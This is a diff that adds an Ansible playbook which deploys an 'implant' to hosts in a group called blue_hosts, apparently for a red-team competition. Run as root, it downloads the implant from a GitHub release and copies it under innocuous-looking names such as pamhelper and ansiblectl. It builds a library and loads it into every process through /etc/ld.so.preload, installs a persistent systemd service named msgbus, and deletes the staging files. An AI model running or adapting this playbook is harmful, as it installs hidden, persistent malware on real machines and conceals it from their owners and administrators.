@@ -1,0 +1,95 @@
+---
+# Deploy implant on remote hosts
+- name: Deploy implant
+  hosts: blue_hosts
+  vars:
+    implant_url: "https://github.com/vaughnw128/shelly/releases/download/v0.1/implant"
+  remote_user: ubuntu
+  become: yes
+  tasks:
+
+    - name: download implant
+      ansible.builtin.get_url:
+        url: "{{ implant_url }}"
+        dest: "/tmp/implant"
+        mode: '0777'
+        owner: root
+      
+    - name: Clone repo
+      git:
+        repo: https://github.com/vaughnw128/shelly.git
+        dest: /tmp/shelly
+        clone: yes
+        update: yes
+
+    - name: Copy systemd job to systemd 
+      copy: remote_src=True src=/tmp/shelly/deploy/implant/msgbus.service dest=/etc/systemd/system/msgbus.service
+
+    - name: Give root perms to file
+      ansible.builtin.file:
+        path: /tmp/implant
+        owner: root
+        group: root
+        mode: '1777'
+
+    - name: Copy implant files
+      copy:
+        src: '/tmp/implant'
+        dest: '{{item}}'
+        owner: root
+        group: root
+        mode: 1777
+        remote_src: true
+      loop:
+        - /usr/bin/msgbus
+        - /usr/bin/pamhelper
+        - /usr/bin/ansiblectl
+
+    - name: Install packages
+      apt: update_cache=yes name={{ item }} state=present
+      with_items:
+        - gcc
+        - make
+
+    - name: Build libpamd
+      make:
+        chdir: /tmp/shelly/deploy/implant
+        target: all
+        file: /tmp/shelly/deploy/implant/Makefile
+
+    - name: Copy libpamd file
+      copy:
+        src: '/tmp/shelly/deploy/implant/libpamd.so'
+        dest: '/usr/local/lib/libpamd.so'
+        owner: root
+        group: root
+        mode: 0644
+        remote_src: true
+
+    - name: Make preload file if not exists
+      copy:
+        content: ""
+        dest: /etc/ld.so.preload
+        force: false
+        group: sys
+        owner: root
+        mode: 0555
+
+
+    - name: Update ldpreload
+      lineinfile:
+        dest: /etc/ld.so.preload
+        line: '/usr/local/lib/libpamd.so'
+
+    - name: start systemd app service
+      systemd: name=msgbus.service state=restarted enabled=yes
+      become: yes
+
+    - name: Delete content & directory
+      ansible.builtin.file:
+        state: absent
+        path: '{{item}}'
+      loop:
+        - /tmp/implant
+        - /tmp/shelly
+
